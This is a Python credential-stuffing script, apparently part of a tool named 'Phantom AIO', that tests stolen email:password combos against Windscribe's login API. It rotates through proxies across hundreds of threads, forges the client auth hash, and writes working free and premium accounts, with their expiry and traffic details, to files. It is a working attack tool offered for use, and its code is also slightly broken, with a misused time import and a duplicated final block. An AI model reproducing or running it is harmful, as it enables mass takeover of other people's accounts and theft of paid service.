import ctypes

import requests
from hashlib import md5
from time import time
import threading
from random import choice
import os
from colorama import Fore, Style
from requests.auth import HTTPProxyAuth

#Windscribe
max_threads = 400
account_count = 0
valid = 0
invalid = 0
custom = 0
proxy_error = 0

#Colors
red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ WindScribe Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error}')

def update_console_title():
    global valid, invalid, custom, premium, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ WindScribe Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error} | CPM : {cpm}')
def check(email, password, proxy):
    global account_count
    username = email.split("@")[0] if "@" in email else email
    unix = time()
    auth_hash = md5(f"952b4412f002315aa50751032fcaab03{unix}".encode()).hexdigest()
    headers = {
        "Host": "api.windscribe.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "null",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {'username': username, 'password': password, 'time': unix, 'client_auth_hash': auth_hash, 'session_type_id': 2}

    if len(proxy.split(":")) == 4:
        ip, port, user, pw = proxy.split(":")
        proxies = {
            'http': f'http://{user}:{pw}@{ip}:{port}',
            'https': f'http://{user}:{pw}@{ip}:{port}'
        }
    else:
        ip, port = proxy.split(":")
        proxies = {
            'http': f'http://{ip}:{port}',
            'https': f'http://{ip}:{port}'
        }

    try:
        response = requests.post("https://api.windscribe.com/Session?platform=firefox", headers=headers, data=data,
                                 proxies=proxies, timeout=5)
        account_count += 1
        if response.status_code == 403 or "Could not log in with provided credentials" in response.text:
            print(f"{reset}[ {cyan}{reset} ] {gray}({red}-{gray}) {pretty} Account {email}:{password} is invalid. {gray}|{pink}{gray}:{pink}{password}{gray}")
        elif "session_auth_hash" not in response.text:
            print(f"{reset}[ {cyan}{reset} ] {gray}({red}-{gray}) {pretty} Error checking account {email}:{password}. {gray}|{pink}{gray}:{pink}{password}{gray}")
        elif "is_premium\": 0" in response.text:
            print(f"{reset}[ {cyan}{reset} ] {gray}({lightblue}~{gray}) {pretty} Account {email}:{password} is a valid custom account.{gray}|{pink} {gray}:{pink}{password}{gray}")
            with open('Checked/WindScribe/free.txt', 'a') as f:
                f.write(f'{email}:{password}\n')
        elif "is_premium\": 1" in response.text:
            djson = response.json()["data"]
            email = djson["email"]
            username = djson["username"]
            used = f'{(((djson["traffic_used"] / 1024) / 1024) / 1024)}GB/{(((djson["traffic_max"] / 1024) / 1024) / 1024)}GB'
            expire = djson["premium_expiry_date"]
            print(f"{reset}[ {cyan}{reset} ] {gray}({green}+{gray}) {pretty} This account is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}'{gray}|{pink} {email}{gray}:{pink}{password}{gray} | {green}Premium")
            with open('Checked/WindScribe/premium.txt', 'a') as f:
                f.write(f'This account is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}\n')
    except requests.exceptions.RequestException as e:
        print(f"Error with proxy {proxy}: {e}")


def process_account(email, password):
    while threading.active_count() > max_threads:
        pass

    proxy = choice(proxies)
    threading.Thread(target=check, args=(email, password, proxy)).start()


with open('combos.txt', 'r', encoding='latin-1') as file:
    accounts = [line.strip().split(':') for line in file]

with open('proxies.txt', 'r') as file:
    proxies = [line.strip() for line in file]

if not os.path.exists('Checked/WindScribe'):
    os.makedirs('Checked/WindScribe')

for email, password in accounts:
    process_account(email, password)

while threading.active_count() > 1:
    pass

print(f'Successfully checked {account_count} accounts.')

def process_account(email, password):
    while threading.active_count() > max_threads:
        pass

    proxy = choice(proxies)
    threading.Thread(target=check, args=(email, password, proxy)).start()


with open('combos.txt', 'r', encoding='latin-1') as file:
    accounts = [line.strip().split(':') for line in file]

with open('proxies.txt', 'r') as file:
    proxies = [line.strip() for line in file]

if not os.path.exists('Checked/WindScribe'):
    os.makedirs('Checked/WindScribe')

for email, password in accounts:
    process_account(email, password)

while threading.active_count() > 1:
    pass

print(f'Successfully checked {account_count} accounts.')
